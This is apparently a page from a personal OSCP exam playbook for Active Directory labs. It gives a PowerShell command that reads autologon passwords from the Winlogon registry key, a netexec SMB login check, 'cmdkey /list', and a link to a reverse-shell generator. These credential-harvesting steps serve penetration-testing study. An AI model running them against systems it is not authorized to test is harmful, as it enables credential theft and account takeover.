# AD - Local Credential Search

**Step 44 of 50 · AD**

*Search common Windows credential locations after the foothold has no direct group or token path.*

## Run this

> **Why:** This command gathers the ad local credential search evidence needed to decide which documented route applies next.
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
```

## Example output

```

AutoAdminLogon    DefaultUserName       DefaultDomainName  DefaultPassword
--------------    ---------------       -----------------  -----------------
1                 HTB\\svc_accountname   HTB                [redacted]
```
## What did you get?

- [ ] DefaultPassword is populated → **Run `netexec smb $BoxIP -u $Username -p $Password`, then go to Step 45 · [[AD - BloodHound]] after recording the result**
- [ ] Winlogon has no useful values → **Run `cmdkey /list` and inspect the browser profile paths listed in this stage, then go to Step 45 · [[AD - BloodHound]]**
- [ ] A candidate fails with its displayed username → **Set `$Username` to the shortened SAMAccountName, run `netexec smb $BoxIP -u $Username -p $Password`, then return to Step 40 · [[AD - Credential Validation]]**
- [ ] No local credentials are found → **Go to Step 45 · [[AD - BloodHound]]**

## Notes

Winlogon autologon stores a password so Windows can sign in automatically. Treat the output as sensitive.

## Gotcha

> [!warning] 💡
> `DefaultUserName` may be a display name rather than the SAMAccountName. Validate it with NetExec instead of assuming it is the exact login name.
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- confirmed in the box write-up

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
